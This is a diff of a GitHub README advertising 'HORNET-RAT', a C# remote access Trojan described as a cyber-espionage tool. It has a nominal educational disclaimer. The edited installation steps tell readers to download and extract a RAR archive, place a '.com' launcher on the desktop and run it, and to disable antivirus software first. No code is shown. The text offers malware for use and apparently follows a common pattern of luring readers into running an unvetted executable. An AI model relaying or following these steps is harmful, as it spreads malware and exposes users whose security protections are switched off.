@@ -1,5 +1,6 @@
 # HORNET-RAT
-HORNETrat, also known as 'HORNET Worm,' is a sophisticated .NET-based remote access Trojan (RAT) coded in C#. This malware operates with a high degree of technical sophistication and discretion, exhibiting a comprehensive array of functionalities, reminiscent of a Swiss army knife for cyber espionage.
+
+	HORNETrat, also known as 'HORNET Worm,' is a sophisticated .NET-based remote access Trojan (RAT) coded in C#. This malware operates with a high degree of technical sophistication and discretion, exhibiting a comprehensive array of functionalities, reminiscent of a Swiss army knife for cyber espionage.
 ![cop](https://github.com/queentessaru/HORNET-RAT/assets/142797937/25b52472-25d3-45f3-bc0b-0a54e7bec5d5)
 			Disclaimer: It is important to emphasize that the use of HORNETrat or any similar malware is illegal and unethical. This information is shared solely for educational purposes, and the author and publisher disclaim any responsibility for misuse or unlawful activities associated with this knowledge.
 
@@ -29,9 +30,8 @@ HORNETrat, also known as 'HORNET Worm,' is a sophisticated .NET-based remote acc
 ### Installation Instructions:
 
  1. Download the program from the GitHub repository.
- 2. Locate and download the “fff.rar” file.
- 3. Extract the application from the “fff.rar” file.
- 4. Place the extracted application on your desktop.
+ 2. Extract the application from the “HORNETrat_launcher.rar” file.
+ 3. Place the extracted .com application on your desktop.
 
 ## Note: • Ensure that your antivirus software is disabled while using the program for seamless operation.
 
